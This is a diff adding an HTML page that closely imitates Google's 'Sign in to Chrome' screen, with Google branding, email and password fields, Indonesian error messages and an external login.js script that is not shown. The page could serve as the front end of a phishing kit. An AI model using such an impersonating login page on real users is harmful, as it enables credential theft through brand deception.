@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Chrome - Sign In</title>
+  <link rel="stylesheet" href="login.css">
+</head>
+<body>
+
+  <div id="screenShadow" class="screen-shadow hidden"></div>
+
+  <button class="btn-back hidden" id="btnBackToEmail" title="Back">
+    <svg viewBox="0 0 24 24" fill="currentColor">
+      <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+    </svg>
+  </button>
+
+  <div id="boxStep1" class="chrome-prompt">
+    <div class="chrome-avatar-lg">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome">
+    </div>
+    <h1>Sign in to Chrome</h1>
+    <p class="subtitle">Get additional features</p>
+
+    <div class="features-grid">
+      <div class="feature-card">
+        <img class="feat-photo" src="Asset/t1.png" alt="Devices">
+        <h3>All your devices</h3>
+        <p>Easily pick up where you left off</p>
+      </div>
+
+      <div class="feature-card">
+        <img class="feat-photo" src="Asset/t3.png" alt="Security">
+        <h3>Stronger security</h3>
+        <p>Protect your passwords against phishing</p>
+      </div>
+
+      <div class="feature-card">
+        <img class="feat-photo" src="Asset/t2.png" alt="Backup">
+        <h3>Back up your stuff</h3>
+        <p>Save your bookmarks and more with sync</p>
+      </div>
+    </div>
+
+    <div class="action-footer-step1">
+      <button class="btn-blue" id="btnToStep2">Sign in</button>
+      <button class="btn-inverted" id="btnStayOut">Stay signed out</button>
+    </div>
+  </div>
+
+  <div id="googleCardWrapper" class="card-wrapper hidden">
+    <div class="google-card">
+      
+      <div id="loadingLine" class="loading-line hidden">
+        <div class="blue-mover"></div>
+      </div>
+
+      <div class="card-left">
+        <svg class="google-g" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+          <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+          <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
+          <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+        </svg>
+
+        <h2 id="cardTitle">Sign in to Chrome</h2>
+        <p id="cardSubtitle">Use your Google Account</p>
+        
+        <div id="accountPill" class="account-pill hidden">
+          <img class="avatar-mini" src="Asset/pw.png" alt="Avatar">
+          <span id="txtDisplayEmail"></span>
+          <span class="arrow-down">▼</span>
+        </div>
+      </div>
+
+      <div class="card-right-form">
+        <div class="form-slide-container">
+          
+          <div id="subStepEmail" class="slide-content">
+            <div class="input-group" id="groupEmail">
+              <input type="text" id="inputEmail" required placeholder=" ">
+              <label>Email or phone</label>
+            </div>
+            <p id="errorEmail" class="error-text hidden">
+              <img src="Asset/w.png" class="error-img" alt="Alert"> 
+              Tidak dapat menemukan Akun Google Anda
+            </p>
+            <a href="#" class="link-blue">Forgot email?</a>
+            <p class="notice-text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="link-blue">Learn more about using Guest mode</a></p>
+          </div>
+
+          <div id="subStepPassword" class="slide-content hidden">
+            <div class="input-group" id="groupPassword">
+              <input type="password" id="inputPassword" required placeholder=" ">
+              <label>Enter your password</label>
+            </div>
+            <p id="errorPassword" class="error-text hidden">
+              <img src="Asset/w.png" class="error-img" alt="Alert"> 
+              Sandi salah. Coba lagi atau klik "Lupa sandi?" untuk opsi lainnya
+            </p>
+            <div class="checkbox-group">
+              <input type="checkbox" id="chkShowPassword">
+              <label for="chkShowPassword">Show password</label>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="form-buttons">
+          <div class="action-wrapper-right">
+            <a href="#" class="link-blue btn-side-link" id="linkCreateAccount">Create account</a>
+            <button class="btn-next" id="btnEmailNext">Next</button>
+
+            <a href="#" class="link-blue btn-side-link hidden" id="linkForgotPassword">Forgot password?</a>
+            <button class="btn-next hidden" id="btnPasswordNext">Next</button>
+          </div>
+        </div>
+      </div>
+
+    </div>
+    
+    <div class="google-footer">
+      <span class="lang-selector">English (United States) ▼</span>
+      <div class="footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+      </div>
+    </div>
+  </div>
+
+  <script src="login.js"></script>
+</body>
+</html>
